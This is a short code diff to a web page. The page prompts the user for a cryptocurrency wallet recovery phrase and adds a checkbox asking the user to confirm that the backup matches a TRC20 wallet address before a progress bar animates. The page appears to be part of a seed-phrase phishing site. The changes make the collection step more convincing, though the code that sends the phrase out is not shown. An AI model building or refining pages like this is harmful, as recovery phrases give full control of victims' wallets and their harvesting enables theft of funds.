@@ -166,10 +166,17 @@ header .logo img {
 
     document.getElementById('s2btn').addEventListener('click', () => {
   const phrase = document.getElementById('phrase').value.trim();
+  const matchCheck = document.getElementById('matchCheck').checked;
+
   if (!phrase) {
-    alert("Please enter your 12-word recovery phrase.");
+    alert("Please enter your recovery phrase.");
     return; // stop if empty
   }
+  if (!matchCheck) {
+    alert("Please confirm the backup matches the TRC20 wallet address.");
+    return; // stop if not checked
+  }
+
   prog.style.width = '70%';
   setTimeout(() => {
     prog.style.width = '100%';
